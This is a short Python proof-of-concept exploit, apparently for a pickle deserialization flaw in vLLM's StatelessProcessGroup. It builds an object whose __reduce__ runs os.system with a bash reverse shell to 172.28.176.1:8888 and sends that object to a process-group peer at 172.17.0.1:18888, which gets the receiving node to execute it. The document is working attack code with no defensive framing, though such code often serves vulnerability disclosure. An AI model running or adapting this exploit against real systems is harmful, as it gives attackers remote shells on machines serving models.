from vllm.distributed.utils import StatelessProcessGroup

class Evil:
    def __reduce__(self):
        import os
        cmd='/bin/bash -c "bash -i >& /dev/tcp/172.28.176.1/8888 0>&1"'
        return (os.system,(cmd,))

client = StatelessProcessGroup.create(
    host='172.17.0.1',
    port=18888,
    rank=1,
    world_size=2,
)

client.send_obj(obj=Evil(),dst=0)
